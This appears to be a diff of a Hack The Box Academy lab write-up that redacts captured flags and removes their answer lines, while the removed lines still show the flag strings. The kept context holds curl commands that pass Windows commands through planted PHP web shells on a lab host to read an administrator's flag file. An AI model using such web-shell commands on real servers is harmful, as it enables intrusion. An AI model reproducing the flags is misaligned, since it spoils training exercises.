@@ -333,15 +333,14 @@ Query OK, 1 row affected (0.015 sec)
 # Method 1 shell usage:
 curl -w "\n" http://10.129.242.84/1af271ec0935f7ccbd31dc24666f7f33.php?c=type%20C:\\users\\administrator\\desktop\\flag.txt
 
-HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}
+HTB{...}
 
 # Method 2 shell usage:
 curl -w "\n" http://10.129.242.84/90957b76a1f20de2b13c5bcb2d05b5cf.php?c=type%20C:\\users\\administrator\\desktop\\flag.txt
 
-HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}
+HTB{...}
 ```
 
-**Flag**: `HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}`
 
 ---
 
@@ -722,10 +721,8 @@ Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-107-generic x86_64)
 ```bash
 # HTB Academy flag extraction
 simon@lin-medium:~$ cat flag.txt
-HTB{1qay2wsx3EDC4rfv_M3D1UM}
+HTB{...}
 ```
-
-**Flag**: `HTB{1qay2wsx3EDC4rfv_M3D1UM}`
 
 ---
 
@@ -1152,13 +1149,12 @@ GO
 
 output
 ---------------------------------------------
-HTB{46u$!n9_l!nk3d_$3rv3r$}
+HTB{...}
 NULL
 
 (2 rows affected)
 ```
 
-**Flag**: `HTB{46u$!n9_l!nk3d_$3rv3r$}` ✅ (Question 4 answer)
 
 ---
 
